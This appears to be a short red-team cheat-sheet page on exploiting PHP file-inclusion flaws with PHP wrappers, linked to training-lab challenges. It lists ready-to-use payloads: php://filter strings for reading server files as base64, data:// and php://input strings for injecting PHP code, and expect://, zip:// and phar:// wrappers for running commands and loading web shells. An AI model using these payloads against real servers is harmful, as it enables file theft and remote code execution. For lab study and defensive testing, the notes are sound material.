# PHP Wrappers File Inclusion

[![fileinclusion](../../../../../_badges/htb/fileinclusion.svg)](https://academy.hackthebox.com/course/preview/file-inclusion)
[![filepathtraversal](../../../../../../cybersecurity/_badges/thm/filepathtraversal.svg)](https://tryhackme.com/r/room/filepathtraversal)
[![php_filters](../../../../../_badges/rootme/web_server/php_filters.svg)](https://www.root-me.org/en/Challenges/Web-Server/PHP-Filters)
[![remote_file_inclusion](../../../../../_badges/rootme/web_server/remote_file_inclusion.svg)](https://www.root-me.org/en/Challenges/Web-Server/Remote-File-Inclusion)
[![xslt_code_execution](../../../../../_badges/rootme/web_server/xslt_code_execution.svg)](https://www.root-me.org/en/Challenges/Web-Server/XSLT-Code-execution)
[![local_file_inclusion_wrappers](../../../../../_badges/rootme/web_server/local_file_inclusion_wrappers.svg)](https://www.root-me.org/fr/Challenges/Web-Serveur/Local-File-Inclusion-Wrappers)
[![pyrat_auction](../../../../../_badges/rootme/realist/pyrat_auction.svg)](https://www.root-me.org/en/Challenges/Realist/PyRat-Auction-83)

<div class="row row-cols-lg-2"><div>

PHP Wrappers can be used to exploit a [LFI/RFI](/cybersecurity/red-team/s3.exploitation/vulns/web/file_inclusion.md#php-include-file-inclusion) on a server as an alternative to path traversal or similar techniques.

To **read** a file (encoded as base64):  `php://filter/read=convert.base64-encode/resource=/path/to/file` or use `php://filter/zlib.deflate/read=convert.base64-encode/resource=/path/to/file` for shorter payloads. [Refer to this to automatically decode it](/cybersecurity/red-team/s3.exploitation/vulns/cheatsheet/payloads.md#php--catch-requests). You may also use `string.rot13` or `string.rot13`.

To **inject** some code (encoded as base64):

* `data:text/plain,<?php%20phpinfo();%20?>`
* `data://text/plain;base64,<base64 php code here>`
* `php://filter/convert.base64-decode/resource=data://plain/text,<base64 php code here>` <small>(is RFI the only one?)</small>
* `allow_url_include` must be enabled ðŸ›‘

To **inject** some code (as POST data), inject `php://input` and use:

```ps
$ curl -s -X POST --data '<?php /* code */ ?>' [...]
```
</div><div>

We can also use some special wrappers:

* `expect://id`: run the `id` command, not often installed
* `zip://./path/to/shell.zip%23shell.php&cmd=id`: if enabled, we can load a shell inside a zip <small>(.zip extension not mandatory)</small>.
* `phar://./path/to/shell.phar%2Fshell.php&cmd=id`: if enabled, we can load a shell inside a zip <small>(.phar extension not mandatory)</small>.

Refer to [payloads](/cybersecurity/red-team/s3.exploitation/vulns/cheatsheet/payloads.md#phar) to generate phar archives or to write PHP code.
</div></div>
